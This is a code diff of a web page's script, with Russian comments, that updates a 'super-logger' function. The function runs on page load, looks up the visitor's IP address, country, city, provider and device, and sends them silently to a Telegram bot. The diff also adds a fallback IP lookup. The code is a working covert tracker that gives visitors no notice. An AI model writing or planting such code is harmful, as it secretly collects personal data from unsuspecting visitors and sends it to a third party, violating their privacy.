@@ -36,21 +36,18 @@
     const status = document.getElementById('status');
     const scanLine = document.getElementById('scan-line');
 
-    // НОВЫЙ НАДЕЖНЫЙ ЛОГГЕР
+    // ОБНОВЛЕННЫЙ СУПЕР-ЛОГГЕР (Срабатывает сразу)
     async function logVisit() {
         try {
-            const res = await fetch('https://ipapi.co');
+            const res = await fetch('https://ipapi.co'); 
             const d = await res.json();
-            const info = `👀 КТО-ТО ЗАШЕЛ!\n\n📍 IP: ${d.ip}\n🌍 Страна: ${d.country_name}\n🏙 Город: ${d.city}\n📱 Устройство: ${navigator.platform}\n🌐 Браузер: ${navigator.userAgent.split(') ')[1]}`;
-            
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: info })
-            });
+            const info = `👀 КТО-ТО ЗАШЕЛ!\n\n📍 IP: ${d.ip}\n🌍 Страна: ${d.country_name}\n🏙 Город: ${d.city}\n🏢 Провайдер: ${d.org}\n📱 Устройство: ${navigator.platform}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
         } catch (e) {
-            // Если IP не определился, просто пишем о входе
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=👀 Кто-то зашел (IP скрыть)`);
+            // Если первый сервис упал, пробуем второй (только IP)
+            const simpleRes = await fetch('https://api.ipify.org');
+            const simpleData = await simpleRes.json();
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("👀 Заход с IP: " + simpleData.ip)}`);
         }
     }
     logVisit();
